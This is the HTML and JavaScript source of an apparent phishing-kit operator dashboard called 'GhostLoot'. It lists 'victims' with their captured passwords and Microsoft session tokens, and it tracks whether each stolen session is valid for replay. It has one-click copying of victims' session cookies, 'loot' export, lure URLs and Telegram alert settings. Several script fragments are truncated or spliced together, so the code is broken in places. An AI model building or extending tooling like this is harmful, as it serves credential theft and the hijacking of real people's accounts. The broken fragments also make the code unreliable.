<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>GhostLoot</title>
<style>
  :root {
    --bg: #1c1914;
    --bg2: #141210;
    --panel: #221e18;
    --ink: #f0ebe3;
    --mute: #9a9186;
    --faint: #6e675e;
    --line: #3d372f;
    --copper: #d4783c;
    --copper-dim: #8a4e28;
    --olive: #8fa86a;
    --olive-dim: #3f4c2e;
    --bad: #c45c4a;
    --warn: #c9a227;
    --sans: "Avenir Next", Avenir, "Segoe UI", sans-serif;
    --display: "DIN Alternate", "Avenir Next Condensed", "Bahnschrift", "Arial Narrow", sans-serif;
    --mono: "IBM Plex Mono", "Source Code Pro", Menlo, Consolas, monospace;
  }
  * { box-sizing: border-box; }
  html, body { margin: 0; height: 100%; }
  html { color-scheme: dark; }
  body {
    background: var(--bg);
    color: var(--ink);
    font: 14px/1.45 var(--sans);
    display: grid;
    grid-template-columns: 148px 1fr;
    grid-template-rows: auto 1fr auto;
    grid-template-areas: "top top" "rail main" "foot foot";
    min-height: 100%;
  }
  button, input, select { font: inherit; color: inherit; }
  a { color: var(--copper); text-decoration: none; }
  a:hover { text-decoration: underline; }
  :focus-visible { outline: 2px solid var(--copper); outline-offset: 2px; }

  .top {
    grid-area: top;
    display: flex; align-items: baseline; gap: 18px;
    padding: 14px 20px 12px;
    border-bottom: 1px solid var(--line);
    background: var(--bg2);
    flex-wrap: wrap;
  }
  .wordmark {
    font-family: var(--display);
    font-size: 22px; font-weight: 600; letter-spacing: -0.02em;
    line-height: 1; color: var(--ink);
    border-bottom: 2px solid var(--copper);
    padding-bottom: 1px;
  }
  .facts { margin: 0; color: var(--mute); font-size: 13px; flex: 1; min-width: 220px; }
  .facts b { color: var(--ink); font-weight: 600; }
  .facts .ok { color: var(--olive); }
  .facts .bad { color: var(--bad); }
  .tools { display: flex; align-items: center; gap: 8px; flex-wrap: wrap; }
  .search { position: relative; }
  .search input {
    background: var(--bg); border: 1px solid var(--line); color: var(--ink);
    padding: 6px 10px 6px 28px; width: 220px; border-radius: 2px;
  }
  .search input:focus { border-color: var(--copper); outline: none; }
  .search span { position: absolute; left: 8px; top: 6px; color: var(--faint); font-family: var(--mono); font-size: 12px; }
  .btn {
    background: transparent; border: 1px solid var(--line); color: var(--ink);
    padding: 6px 10px; border-radius: 2px; cursor: pointer; white-space: nowrap;
  }
  .btn:hover { border-color: var(--copper); color: var(--copper); }
  .btn.on { border-color: var(--copper); color: var(--copper); }
  .btn.primary { background: var(--copper); border-color: var(--copper); color: #1c1914; font-weight: 600; }
  .btn.primary:hover { filter: brightness(1.08); color: #1c1914; }
  .btn[disabled] { opacity: .4; cursor: default; }

  .rail {
    grid-area: rail;
    border-right: 1px solid var(--line);
    background: var(--bg2);
    padding: 12px 0;
    display: flex; flex-direction: column; gap: 2px;
  }
  .rail button {
    display: block; width: 100%; text-align: left;
    background: none; border: 0; border-left: 2px solid transparent;
    color: var(--mute); padding: 8px 16px; cursor: pointer;
  }
  .rail button:hover { color: var(--ink); }
  .rail button.on { color: var(--ink); border-left-color: var(--copper); background: var(--panel); }
  .rail .hint { margin-top: auto; padding: 12px 16px; color: var(--faint); font-size: 11px; font-family: var(--mono); }

  main { grid-area: main; display: flex; flex-direction: column; min-width: 0; min-height: 0; }
  .dombar { display: none; gap: 10px; padding: 8px 16px; flex-wrap: wrap; align-items: center; border-bottom: 1px solid var(--line); font-size: 12px; color: var(--mute); }
  .dchip { display: inline-flex; align-items: center; gap: 6px; }
  .dchip i { width: 7px; height: 7px; display: inline-block; }
  .dchip i.ok { background: var(--olive); }
  .dchip i.down { background: var(--bad); }
  .dchip i.flag { background: var(--warn); }

  .toolbar { display: flex; align-items: center; gap: 12px; padding: 10px 16px; flex-wrap: wrap; border-bottom: 1px solid var(--line); }
  .toolbar select { background: var(--bg); border: 1px solid var(--line); padding: 5px 8px; border-radius: 2px; }
  .chk { display: inline-flex; align-items: center; gap: 6px; color: var(--mute); cursor: pointer; user-select: none; font-size: 13px; }
  .count { margin-left: auto; color: var(--faint); font-size: 12px; font-family: var(--mono); }

  .stage { flex: 1; display: grid; grid-template-rows: 1fr minmax(200px, 34vh); min-height: 0; }
  .tablewrap { overflow: auto; }
  table { border-collapse: collapse; width: 100%; min-width: 720px; }
  thead th {
    position: sticky; top: 0; background: var(--bg);
    color: var(--mute); font-weight: 500; font-size: 12px;
    text-align: left; padding: 8px 12px; border-bottom: 1px solid var(--line);
    cursor: pointer; white-space: nowrap;
  }
  thead th.sorted { color: var(--ink); }
  tbody td { padding: 8px 12px; border-bottom: 1px solid #2a261f; vertical-align: middle; }
  tbody tr { cursor: pointer; }
  tbody tr:hover td { background: #26221b; }
  tbody tr.sel td { background: #2c241c; box-shadow: inset 3px 0 0 var(--copper); }
  tbody tr.new td { background: #2a2618; }
  .u { font-weight: 600; }
  .mut { color: var(--faint); }
  .num { font-family: var(--mono); font-variant-numeric: tabular-nums; font-size: 13px; }
  .phl { font-family: var(--mono); font-size: 12px; color: var(--mute); }
  .kind { font-family: var(--display); font-size: 13px; letter-spacing: .02em; }
  .kind.msa { color: var(--copper); }
  .kind.entra { color: var(--olive); }
  .kind.none { color: var(--faint); }
  .persist { color: var(--mute); font-size: 12px; margin-left: 6px; }
  .mark { font-size: 11px; color: var(--mute); margin-left: 8px; }

  .inspector {
    border-top: 1px solid var(--line);
    background: var(--panel);
    overflow: auto;
    padding: 14px 16px 18px;
  }
  .inspector h2 { margin: 0 0 4px; font-size: 16px; font-weight: 600; }
  .inspector .sub { color: var(--mute); font-size: 13px; margin: 0 0 12px; font-family: var(--mono); }
  .insp-actions { display: flex; gap: 8px; flex-wrap: wrap; margin-bottom: 12px; }
  .meta-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(220px, 1fr)); gap: 8px 20px; margin-bottom: 12px; }
  .meta-grid .k { color: var(--faint); font-size: 12px; }
  .meta-grid .v { word-break: break-all; font-size: 13px; }
  .attempts { display: flex; flex-direction: column; gap: 4px; }
  .attempts .a {
    display: flex; align-items: center; gap: 10px; flex-wrap: wrap;
    padding: 6px 0; border-bottom: 1px solid var(--line); font-size: 13px;
  }
  .secret {
    font-family: var(--mono); font-size: 12px; cursor: pointer;
    background: var(--bg2); border: 1px solid var(--line); padding: 2px 8px; max-width: 160px;
    overflow: hidden; text-overflow: ellipsis; white-space: nowrap;
    display: inline-block; vertical-align: middle;
  }
  .secret.hide { color: transparent; filter: blur(5px); user-select: none; }
  .cookies-list { font-family: var(--mono); font-size: 12px; color: var(--mute); max-height: 140px; overflow: auto; border: 1px solid var(--line); padding: 8px; background: var(--bg2); }
  .cookies-list .strong { color: var(--copper); }
  .vstate { display: flex; align-items: center; gap: 10px; margin-top: 12px; flex-wrap: wrap; }
  .vstate input.notes { flex: 1; min-width: 180px; background: var(--bg2); border: 1px solid var(--line); padding: 6px 8px; border-radius: 2px; }
  .empty-insp { color: var(--faint); padding: 24px 4px; }

  #urlsview, #settingsview, #luresview, #dashview { padding: 12px 16px 40px; overflow: auto; flex: 1; }
  .dash-head { display: flex; align-items: flex-end; justify-content: space-between; gap: 16px; flex-wrap: wrap; margin-bottom: 18px; }
  .dash-head h2 { margin: 0; font-size: 20px; font-weight: 600; }
  .dash-head .sub { margin: 4px 0 0; color: var(--mute); font-size: 13px; }
  .periods { display: flex; gap: 6px; }
  .dash-nums { display: grid; grid-template-columns: repeat(auto-fill, minmax(132px, 1fr)); gap: 16px 28px; margin-bottom: 22px; padding-bottom: 18px; border-bottom: 1px solid var(--line); }
  .dash-nums .n { font-family: var(--display); font-size: 28px; line-height: 1; font-variant-numeric: tabular-nums; }
  .dash-nums .l { color: var(--mute); font-size: 13px; margin-top: 4px; }
  .dash-nums .d { font-size: 12px; color: var(--faint); margin-top: 3px; font-family: var(--mono); }
  .dash-nums .d.up { color: var(--olive); }
  .dash-nums .d.down { color: var(--bad); }
  .dash-chart { margin-bottom: 22px; }
  .cap { color: var(--mute); font-size: 13px; margin-bottom: 8px; }
  .bars { display: flex; align-items: flex-end; gap: 3px; height: 140px; }
  .bars .col { flex: 1; min-width: 0; height: 100%; display: flex; flex-direction: column; justify-content: flex-end; align-items: center; }
  .bars .stack { width: 100%; max-width: 26px; height: 118px; display: flex; flex-direction: column; justify-content: flex-end; }
  .bars .b-all, .bars .b-ok { width: 100%; min-height: 0; }
  .bars .b-all { background: #3d372f; }
  .bars .b-ok { background: var(--copper); }
  .bars .lab { font-size: 10px; color: var(--faint); margin-top: 5px; font-family: var(--mono); white-space: nowrap; overflow: hidden; max-width: 100%; }
  .kind-split { display: flex; height: 7px; background: var(--line); margin: 6px 0 14px; max-width: 420px; }
  .kind-split .msa { background: var(--copper); }
  .kind-split .entra { background: var(--olive); }
  .dash-two { display: grid; grid-template-columns: 1fr 1fr; gap: 28px; }
  @media (max-width: 860px) { .dash-two { grid-template-columns: 1fr; } }
  .urlbar { display: flex; gap: 8px; flex-wrap: wrap; align-items: center; margin-bottom: 12px; }
  .urlbar input { background: var(--bg2); border: 1px solid var(--line); padding: 7px 10px; border-radius: 2px; min-width: 280px; flex: 1; }
  .urlrow { display: flex; align-items: center; gap: 10px; padding: 8px 0; border-bottom: 1px solid var(--line); }
  .urlrow .url { font-family: var(--mono); font-size: 13px; color: var(--copper); cursor: pointer; word-break: break-all; }
  .urlrow .lab { color: var(--mute); font-size: 12px; }
  .urlrow .sp { flex: 1; }
  #settingsview { max-width: 560px; }
  #settingsview h3 { margin: 0 0 4px; font-size: 16px; font-weight: 600; }
  #settingsview .sub { color: var(--mute); font-size: 13px; margin: 0 0 14px; }
  .frow { display: flex; flex-direction: column; gap: 4px; margin: 10px 0; }
  .frow label { color: var(--mute); font-size: 13px; }
  .frow input[type=text] { background: var(--bg2); border: 1px solid var(--line); padding: 8px 10px; font-family: var(--mono); border-radius: 2px; }
  .setchk { display: flex; align-items: center; gap: 8px; margin: 10px 0; cursor: pointer; }
  .setbtns { display: flex; gap: 8px; margin-top: 14px; }
  .note { color: var(--faint); font-size: 12px; line-height: 1.55; margin-top: 14px; }
  .note code { font-family: var(--mono); color: var(--ink); background: var(--bg2); padding: 0 4px; }
  .empty { text-align: center; color: var(--faint); padding: 36px 12px; }

  #toast {
    position: fixed; bottom: 36px; right: 18px; background: var(--panel);
    border: 1px solid var(--copper); color: var(--ink); padding: 10px 14px;
    opacity: 0; transform: translateY(8px); transition: .15s; z-index: 50; max-width: 340px; pointer-events: none;
  }
  #toast.show { opacity: 1; transform: none; }
  footer {
    grid-area: foot; padding: 6px 16px; border-top: 1px solid var(--line);
    background: var(--bg2); color: var(--faint); font-size: 11px; font-family: var(--mono);
    display: flex; gap: 14px; flex-wrap: wrap;
  }
  #help {
    position: fixed; inset: 0; background: rgba(20,18,16,.72); z-index: 60;
    display: flex; align-items: center; justify-content: center; padding: 24px;
  }
  #help[hidden] { display: none; }
  #help .card { background: var(--panel); border: 1px solid var(--line); padding: 18px 22px; max-width: 420px; width: 100%; }
  #help h2 { margin: 0 0 10px; font-size: 16px; }
  #help dl { margin: 0; display: grid; grid-template-columns: 72px 1fr; gap: 6px 12px; font-size: 13px; }
  #help dt { font-family: var(--mono); color: var(--copper); }
  #help dd { margin: 0; color: var(--mute); }

  @media (max-width: 860px) {
    body { grid-template-columns: 1fr; grid-template-areas: "top" "rail" "main" "foot"; }
    .rail { flex-direction: row; overflow-x: auto; border-right: 0; border-bottom: 1px solid var(--line); padding: 0; }
    .rail button { border-left: 0; border-bottom: 2px solid transparent; white-space: nowrap; }
    .rail button.on { border-bottom-color: var(--copper); }
    .rail .hint { display: none; }
    .stage { grid-template-rows: 1fr minmax(240px, 50vh); }
    .search input { width: 140px; }
  }
  @media (prefers-reduced-motion: reduce) {
    #toast { transition: none; }
  }
</style>
</head>
<body>
<header class="top">
  <div class="wordmark">GhostLoot</div>
  <p class="facts" id="facts"></p>
  <div class="tools">
    <div class="search">
      <span>/</span>
      <input id="q" autocomplete="off" spellcheck="false">
    </div>
    <button class="btn" id="refresh" type="button"></button>
    <button class="btn" id="auto" type="button"><span id="autolbl"></span></button>
    <a class="btn" id="loot" href="/export/loot.zip"></a>
    <a class="btn" id="csv" href="/export/sessions.csv"></a>
    <button class="btn" id="langbtn" type="button"></button>
  </div>
</header>

<nav class="rail">
  <button type="button" data-tab="dash"></button>
  <button type="button" class="on" data-tab="victims"></button>
  <button type="button" data-tab="sessions"></button>
  <button type="button" data-tab="lures"></button>
  <button type="button" data-tab="urls"></button>
  <button type="button" data-tab="settings"></button>
  <div class="hint">? keys</div>
</nav>

<main>
  <div class="dombar" id="domains"></div>
  <div class="toolbar" id="toolbar">
    <select id="fphishlet"></select>
    <label class="chk"><input type="checkbox" id="fvalid"> <span id="fvalid_l"></span></label>
    <label class="chk" id="fnoisewrap"><input type="checkbox" id="fnoise"> <span id="fnoise_l"></span></label>
    <span class="count" id="count"></span>
  </div>
  <div class="stage" id="stage">
    <div class="tablewrap">
      <table>
        <thead id="thead"></thead>
        <tbody id="tbody"></tbody>
      </table>
    </div>
    <aside class="inspector" id="inspector"></aside>
  </div>
  <div id="dashview" hidden></div>
  <div id="urlsview" hidden></div>
  <div id="settingsview" hidden></div>
  <div id="luresview" hidden></div>
</main>

<footer>
  <span id="foothealth"></span>
  <span id="footsb"></span>
  <span id="footdb"></span>
</footer>
<div id="toast"></div>
<div id="help" hidden>
  <div class="card">
    <h2 id="help_title"></h2>
    <dl id="help_dl"></dl>
  </div>
</div>

const state = {

function relTime(ts) {

function victims() {
  const m = new Map();
  for (const s of state.raw) {
    const u = (s.username || '').trim(); if (!u) continue;
    const key = u.toLowerCase();
    let v = m.get(key);
    if (!v) { v = { username: u, phishlets: new Set(), sessions: [], valid: false, creds: false, best: null, lastUpdate: 0, lastIP: '' }; m.set(key, v); }
    v.phishlets.add(s.phishlet); v.sessions.push(s);
    if (s.valid) v.valid = true; if (s.password) v.creds = true;
    if (s.update > v.lastUpdate) { v.lastUpdate = s.update; v.lastIP = s.remote_addr; }
    if (!v.best) v.best = s;
    else {
      const b = v.best;
      const better = (s.valid && !b.valid)
        || (s.valid === b.valid && s.persistent && !b.persistent)
        || (s.valid === b.valid && !!s.persistent === !!b.persistent && s.cookies > b.cookies)
        || (s.valid === b.valid && !!s.persistent === !!b.persistent && s.cookies === b.cookies && s.update > b.update);
      if (better) v.best = s;
    }
  }
  return [...m.values()].map(v => {
    const pw = (v.best && v.best.password) || v.password || (v.sessions.find(s => s.password) || {}).password || '';
    return { ...v, phishlets: [...v.phishlets], kind: v.best && v.best.kind, persistent: v.best && v.best.persistent, cookies: v.best ? v.best.cookies : 0, password: pw };
  });
}
function passCell(pw, key) {
  if (!pw) return '<span class="mut">—</span>';
  const on = state.revealed.has(key);
  return `<span class="secret${on ? '' : ' hide'}" data-reveal="${esc(key)}" title="${t('reveal_ph')}">${esc(pw)}</span>`;
}
function noiseCount() { return state.raw.filter(s => !(s.username || '').trim()).length; }

function applyFilter(list, keyUser, keyPhl) {
  const q = state.q.toLowerCase();
  return list.filter(x => {
    if (state.phishlet) { const p = keyPhl(x); const ok = Array.isArray(p) ? p.includes(state.phishlet) : p === state.phishlet; if (!ok) return false; }
    if (state.onlyValid && !x.valid) return false;
    if (q) {
      const extra = [x.lastIP, x.remote_addr, x.token, x.kind, ...(x.tokens || []), ...(x.best && x.best.tokens || [])].filter(Boolean).join(' ');
      const hay = (keyUser(x) + ' ' + extra).toLowerCase();
      if (!hay.includes(q)) return false;
    }
    return true;
  });
}
function sortList(list, getters) {
  const { key, dir } = state.sort; const g = getters[key]; if (!g) return list;
  return list.slice().sort((a, b) => { let x = g(a), y = g(b); if (typeof x === 'string') { x = x.toLowerCase(); y = (y || '').toLowerCase(); } if (x < y) return -1 * dir; if (x > y) return 1 * dir; return 0; });
}

function periodBounds(kind, now) {
  const end = now || new Date();
  const start = new Date(end);
  start.setHours(0, 0, 0, 0);
  const prevStart = new Date(start);
  const prevEnd = new Date(end);
  if (kind === 'week') {
    start.setDate(start.getDate() - ((start.getDay() + 6) % 7));
    prevStart.setTime(start.getTime());
    prevStart.setDate(prevStart.getDate() - 7);
    prevEnd.setDate(prevEnd.getDate() - 7);
  } else if (kind === 'month') {
    start.setDate(1);
    prevStart.setTime(start.getTime());
    prevStart.setMonth(prevStart.getMonth() - 1);
    prevEnd.setMonth(prevEnd.getMonth() - 1);
  } else {
    prevStart.setDate(prevStart.getDate() - 1);
    prevEnd.setDate(prevEnd.getDate() - 1);
  }
  return { start, end, prevStart, prevEnd };
}
function inRange(ts, a, b) {
  if (!ts) return false;
  const ms = ts * 1000;
  return ms >= a.getTime() && ms < b.getTime();
}
function summarize(list) {
  const users = new Set(), replayUsers = new Set();
  let captures = 0, replay = 0, creds = 0, msa = 0, entra = 0, noise = 0;
  const phl = new Map();
  for (const s of list) {
    captures++;
    const u = (s.username || '').trim().toLowerCase();
    if (!u) noise++; else users.add(u);
    if (s.valid) { replay++; if (u) replayUsers.add(u); }
    if (s.password) creds++;
    if (s.kind === 'msa') msa++;
    if (s.kind === 'entra') entra++;
    const p = s.phishlet || '?';
    const e = phl.get(p) || { name: p, n: 0, valid: 0 };
    e.n++; if (s.valid) e.valid++;
    phl.set(p, e);
  }
  return { captures, noise, users: users.size, replay, replayUsers: replayUsers.size, creds, msa, entra, phl: [...phl.values()].sort((a, b) => b.valid - a.valid || b.n - a.n) };
}
function delta(cur, prev) {
  const n = cur - prev;
  if (n === 0) return { n: 0, cls: '', txt: '0' };
  const sign = n > 0 ? '+' : '';
  return { n, cls: n > 0 ? 'up' : 'down', txt: sign + n };
}
function chartBuckets(kind, start, end, sessions) {
  const out = [];
  if (kind === 'day') {
    for (let h = 0; h < 24; h++) {
      const a = new Date(start); a.setHours(h, 0, 0, 0);
      const b = new Date(a); b.setHours(h + 1);
      if (a >= end) break;
      out.push({ label: h % 3 === 0 ? String(h).padStart(2, '0') : '', start: a, end: b });
    }
  } else {
    const a = new Date(start); a.setHours(0, 0, 0, 0);
    while (a < end) {
      const b = new Date(a); b.setDate(b.getDate() + 1);
      const lab = a.toLocaleDateString(LANG === 'es' ? 'es-ES' : 'en-US', kind === 'week'
        ? { weekday: 'short', day: 'numeric' }
        : { day: 'numeric' });
      out.push({ label: lab, start: new Date(a), end: b });
      a.setDate(a.getDate() + 1);
    }
  }
  return out.map(b => {
    const hits = sessions.filter(s => inRange(s.update || s.create, b.start, b.end));
    return { label: b.label, n: hits.length, valid: hits.filter(s => s.valid).length };
  });
}
function renderDash() {
  const kind = state.period || 'week';
  const { start, end, prevStart, prevEnd } = periodBounds(kind, new Date());
  const curList = state.raw.filter(s => inRange(s.update || s.create, start, end));
  const prevList = state.raw.filter(s => inRange(s.update || s.create, prevStart, prevEnd));
  const cur = summarize(curList);
  const prev = summarize(prevList);
  const loc = LANG === 'es' ? 'es-ES' : 'en-US';
  const rangeTxt = start.toLocaleDateString(loc, { day: 'numeric', month: 'short' }) + ' – ' + end.toLocaleDateString(loc, { day: 'numeric', month: 'short', hour: '2-digit', minute: '2-digit' });
  const vs = t('vs_' + kind);
  const metric = (label, now, then) => {
    const d = delta(now, then);
    return `<div><div class="n">${now}</div><div class="l">${label}</div><div class="d ${d.cls}">${d.txt} ${vs}</div></div>`;
  };
  const buckets = chartBuckets(kind, start, end, state.raw);
  const max = Math.max(1, ...buckets.map(b => b.n));
  const bars = buckets.map(b => {
    const hAll = Math.round((b.n / max) * 100);
    const hOk = b.n ? Math.round((b.valid / b.n) * hAll) : 0;
    const rest = Math.max(0, hAll - hOk);
    return `<div class="col" title="${esc(b.label)}: ${b.n} / ${b.valid} ${t('m_replay')}">
      <div class="stack"><div class="b-ok" style="height:${hOk}%"></div><div class="b-all" style="height:${rest}%"></div></div>
      <div class="lab">${esc(b.label)}</div>
    </div>`;
  }).join('');
  const mix = cur.msa + cur.entra;
  const msaPct = mix ? Math.round(cur.msa / mix * 100) : 0;
  const entraPct = mix ? 100 - msaPct : 0;
  const phlRows = cur.phl.length ? cur.phl.map(p =>
    `<tr><td class="phl">${esc(p.name)}</td><td class="num">${p.n}</td><td class="num">${p.valid}</td><td class="num">${p.n ? Math.round(p.valid / p.n * 100) : 0}%</td></tr>`
  ).join('') : `<tr><td colspan="4" class="empty">${t('no_period')}</td></tr>`;
  $('#dashview').innerHTML = `
    <div class="dash-head">
      <div>
        <h2>${t('dash_' + kind)}</h2>
        <p class="sub">${esc(rangeTxt)}</p>
      </div>
      <div class="periods">
        <button type="button" class="btn ${kind === 'day' ? 'on' : ''}" data-period="day">${t('period_day')}</button>
        <button type="button" class="btn ${kind === 'week' ? 'on' : ''}" data-period="week">${t('period_week')}</button>
        <button type="button" class="btn ${kind === 'month' ? 'on' : ''}" data-period="month">${t('period_month')}</button>
      </div>
    </div>
    <div class="dash-nums">
      ${metric(t('m_captures'), cur.captures, prev.captures)}
      ${metric(t('m_accounts'), cur.users, prev.users)}
      ${metric(t('m_replay'), cur.replayUsers, prev.replayUsers)}
      ${metric(t('m_passwords'), cur.creds, prev.creds)}
      ${metric(t('m_msa'), cur.msa, prev.msa)}
      ${metric(t('m_entra'), cur.entra, prev.entra)}
    </div>
    <div class="dash-chart">
      <div class="cap">${t('chart_' + kind)} <span class="mut">· ${t('chart_hint')}</span></div>
      ${cur.captures ? `<div class="bars">${bars}</div>` : `<div class="empty">${t('no_period')}</div>`}
    </div>
    <div class="dash-two">
      <div>
        <div class="cap">${t('kind_mix')}</div>
        <div class="kind-split">${mix ? `<span class="msa" style="width:${msaPct}%"></span><span class="entra" style="width:${entraPct}%"></span>` : ''}</div>
        <div class="mut">${cur.msa} ${t('m_msa')} · ${cur.entra} ${t('m_entra')} · ${cur.noise} ${t('m_noise')}</div>
      </div>
      <div>
        <div class="cap">${t('by_phishlet')}</div>
        <table><thead><tr><th>${t('th_phishlet')}</th><th>${t('m_captures')}</th><th>${t('m_replay')}</th><th>%</th></tr></thead>
        <tbody>${phlRows}</tbody></table>
      </div>
    </div>`;
}

  $('#tbody').innerHTML = rows.length ? rows.map(s => {

    return `<tr data-sel="session:${s.id}" class="${sel ? 'sel' : ''}${state.knownIds.size && !state.knownIds.has(s.id) ? ' new' : ''}">
      <td class="num">${s.id}</td>
      <td class="phl">${esc(s.phishlet)}</td>
      <td>${esc(s.username) || '<span class="mut">—</span>'}</td>
      <td>${passCell(s.password, 's:' + s.id)}</td>
      <td>${kindCell(s)}</td>
      <td class="num">${s.cookies}</td>
      <td class="mut">${esc(s.remote_addr)}</td>
      <td class="mut" title="${absTime(s.update)}">${relTime(s.update)}</td>
    </tr>`;
  }).join('') : `<tr><td colspan="8" class="empty">${t('empty_sessions')}</td></tr>`;
  $('#count').textContent = `${rows.length} ${t('of')} ${all.length} ${t('sessions_l')}`;
  if (!state.sel && rows[0]) state.sel = { type: 'session', key: String(rows[0].id) };
}

function currentSel() {
  if (!state.sel) return null;
  return state.rows.find(r => r.type === state.sel.type && r.key === state.sel.key) || null;
}

function renderInspector() {
  const box = $('#inspector');
  const row = currentSel();
  if (!row) { box.innerHTML = `<div class="empty-insp">${t('empty_insp')}</div>`; return; }
  if (row.type === 'victim') {
    const v = row.data; const b = v.best;
    const vst = (window._vstate || {})[v.username.toLowerCase()] || {};
    const ips = [...new Set(v.sessions.map(s => s.remote_addr).filter(Boolean))];
    box.innerHTML = `
      <h2>${esc(v.username)}</h2>
      <p class="sub">${kindCell(b)} · ${b ? b.cookies : 0} ${t('cookies_w')} · ${v.phishlets.map(esc).join(', ')}</p>
      <div class="insp-actions">
        ${b && b.cookies ? `<button class="btn primary" data-copy="${b.id}">${t('copy_cookies')}</button>
          <button class="btn" data-view="${b.id}">${t('view_json')}</button>
          <button class="btn" data-ck="${b.id}">${t('view_cookies')}</button>` : ''}
        <button class="btn" data-copyuser="${esc(v.username)}">${t('copy_user')}</button>
      </div>
      <div class="meta-grid">
        <div><div class="k">${t('best_session')}</div><div class="v">#${b ? b.id : '—'} · ${b && b.token ? esc(b.token) : t('kind_none')}</div></div>
        <div><div class="k">${t('tokens')}</div><div class="v">${(b && b.tokens && b.tokens.length) ? b.tokens.map(esc).join(', ') : '—'}</div></div>
        <div><div class="k">${t('useragent')}</div><div class="v">${esc(b && b.useragent)}</div></div>
        <div><div class="k">${t('landing')}</div><div class="v">${esc(b && b.landing)}</div></div>
      </div>
      <div class="k" style="margin-bottom:4px;color:var(--faint)">${t('attempts_h')} (${v.sessions.length})</div>
      <div class="attempts">${v.sessions.slice().sort((a, b) => b.update - a.update).map(s => `
        <div class="a">
          <span class="mut">#${s.id}</span>
          <span class="phl">${esc(s.phishlet)}</span>
          ${kindCell(s)}
          <span class="num">${s.cookies}</span>
          <span class="mut">${esc(s.remote_addr)}</span>
          <span class="mut" title="${absTime(s.update)}">${relTime(s.update)}</span>
          ${s.password ? passCell(s.password, 's:' + s.id) : ''}
          ${s.cookies ? `<button class="btn" data-copy="${s.id}">${t('copy_cookies')}</button>` : ''}
        </div>`).join('')}</div>
      <div class="cookies-list" id="ckbox" hidden></div>
      <div class="vstate">
        <label class="setchk"><input type="checkbox" id="vs_used" ${vst.used ? 'checked' : ''}> ${t('mark_used')}</label>
        <input class="notes" id="vs_notes" placeholder="${t('notes_ph')}" value="${esc(vst.notes || '')}">
        <button class="btn" id="vs_save">${t('save')}</button>
        ${ips.length > 1 ? `<span class="mut">IPs: ${ips.map(esc).join(', ')}</span>` : ''}
      </div>`;
    const save = $('#vs_save');
    if (save) save.onclick = async () => {
      const used = $('#vs_used').checked;
      const notes = $('#vs_notes').value;
      await fetch('/api/vstate', { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: new URLSearchParams({ user: v.username, used: used ? 'true' : 'false', notes }) });
      await loadVState(); toast(t('vstate_saved')); render();
    };
    return;
  }
  const s = row.data;
  box.innerHTML = `
    <h2>${esc(s.username) || '#' + s.id}</h2>
    <p class="sub">#${s.id} · ${esc(s.phishlet)} · ${kindCell(s)} · ${s.token ? esc(s.token) : t('kind_none')}</p>
    <div class="insp-actions">
      ${s.cookies ? `<button class="btn primary" data-copy="${s.id}">${t('copy_cookies')}</button>
        <button class="btn" data-view="${s.id}">${t('view_json')}</button>
        <button class="btn" data-ck="${s.id}">${t('view_cookies')}</button>` : ''}
      ${s.username ? `<button class="btn" data-copyuser="${esc(s.username)}">${t('copy_user')}</button>` : ''}
    </div>
    <div class="meta-grid">
      <div><div class="k">${t('tokens')}</div><div class="v">${(s.tokens && s.tokens.length) ? s.tokens.map(esc).join(', ') : '—'}</div></div>
      <div><div class="k">${t('password')}</div><div class="v">${passCell(s.password, 's:' + s.id)}</div></div>
      <div><div class="k">${t('useragent')}</div><div class="v">${esc(s.useragent)}</div></div>
      <div><div class="k">${t('landing')}</div><div class="v">${esc(s.landing)}</div></div>
    </div>
    <div class="cookies-list" id="ckbox" hidden></div>`;
}

async function copyCookies(id) {
  try {
    const r = await fetch('/cookies?id=' + id);
    const arr = await r.json();
    await navigator.clipboard.writeText(JSON.stringify(arr, null, 2));
    toast(t('copied_paste')(id));
  } catch (e) { toast(t('error') + ': ' + e); }
}
async function showCookies(id) {
  const box = $('#ckbox'); if (!box) return;
  if (!box.hidden && box.dataset.id === String(id)) { box.hidden = true; return; }
  box.hidden = false; box.dataset.id = String(id); box.textContent = t('loading');
  try {
    const arr = await (await fetch('/cookies?id=' + id)).json();
    const strong = new Set((currentSel() && (currentSel().data.best || currentSel().data).tokens) || []);
    box.innerHTML = arr.map(c => `<div><span class="${strong.has(c.name) ? 'strong' : ''}">${esc(c.name)}</span> @${esc(c.domain)}</div>`).join('');
  } catch (e) { box.textContent = t('error') + ': ' + e; }
}

let setInit = false;
function renderSettings() {
  const v = $('#settingsview');
  if (!setInit) {
    v.innerHTML =
      `<h3>${t('set_title')}</h3><p class="sub">${t('set_sub')}</p>
       <label class="setchk"><input type="checkbox" id="s_en"> ${t('set_enable')}</label>
       <div class="frow"><label>${t('bot_token')}</label><input type="text" id="s_tok" placeholder="123456:ABC-DEF..." autocomplete="off"></div>
       <div class="frow"><label>${t('chat_id')}</label><input type="text" id="s_chat" placeholder="12345678" autocomplete="off"></div>
       <label class="setchk"><input type="checkbox" id="s_min"> ${t('minimal')}</label>
       <div class="setbtns"><button class="btn primary" id="s_save">${t('save_btn')}</button><button class="btn" id="s_test">${t('send_test')}</button></div>
       <p class="note">${t('set_note')}</p>`;
    $('#s_save').onclick = saveSettings; $('#s_test').onclick = testTelegram; setInit = true;
  }
  loadSettingsForm();
}
async function loadSettingsForm() {
  try {
    const s = await (await fetch('/api/settings')).json();
    $('#s_en').checked = !!s.tg_enabled; $('#s_chat').value = s.tg_chat || ''; $('#s_min').checked = !!s.minimal_alerts;
    $('#s_tok').value = ''; $('#s_tok').placeholder = s.tg_token_set ? t('token_saved') : '123456:ABC-DEF...';
  } catch (e) {}
}
async function saveSettings() {
  const body = new URLSearchParams({ tg_token: $('#s_tok').value.trim(), tg_chat: $('#s_chat').value.trim(), tg_enabled: $('#s_en').checked ? 'true' : 'false', minimal_alerts: $('#s_min').checked ? 'true' : 'false' });
  await fetch('/api/settings', { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body });
  toast(t('settings_saved')); loadSettingsForm();
}
async function testTelegram() { const r = await fetch('/api/test-telegram', { method: 'POST' }); if (r.ok) toast(t('test_sent')); else toast(t('error') + ': ' + (await r.text())); }

let urlsInit = false;
function renderUrls() {
  const v = $('#urlsview');
  if (!urlsInit) {
    v.innerHTML =
      `<div class="urlbar">
         <input id="nu" placeholder="${t('url_ph')}" autocomplete="off">
         <input id="nl" placeholder="${t('label_ph')}" autocomplete="off" style="max-width:160px;min-width:120px">
